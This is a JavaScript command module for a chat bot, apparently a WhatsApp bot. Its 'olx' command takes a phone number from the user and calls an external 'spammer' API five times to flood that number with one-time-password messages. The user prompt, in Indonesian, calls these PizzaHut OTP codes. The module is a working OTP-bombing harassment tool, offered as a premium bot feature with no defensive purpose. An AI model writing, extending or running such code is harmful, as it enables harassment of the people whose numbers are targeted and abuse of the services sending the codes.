let axios = require("axios");
let kntl = require("../src/kntl.json");
let handler = async(m, { conn, args, text }) => {
    //if(args[0].startsWith("08")) return m.reply("_Gunakan Kode Negara
    if(!text) return m.reply('_Masukan Nomor Telepon Yang Akan Dispam Kode OTP PizzaHut')
    try {
    await m.reply(global.wait)
    let api = (kntl.xteam)
	axios.get(`https://api.xteam.xyz/spammer/olx?no=${text}&APIKEY=${api}`)
	axios.get(`https://api.xteam.xyz/spammer/olx?no=${text}&APIKEY=${api}`)
	axios.get(`https://api.xteam.xyz/spammer/olx?no=${text}&APIKEY=${api}`)
	axios.get(`https://api.xteam.xyz/spammer/olx?no=${text}&APIKEY=${api}`)
	axios.get(`https://api.xteam.xyz/spammer/olx?no=${text}&APIKEY=${api}`)
	.then ((res) => {
	let hasil = '```SUCCESS```\n\n*SGDC-BOT*'
        conn.reply(m.chat, hasil, m)
     })
   }catch(e){
   m.reply('```Error```')
   console.log (e)
   }
}

handler.command = /^(olx)$/i

handler.premium = true

module.exports = handler
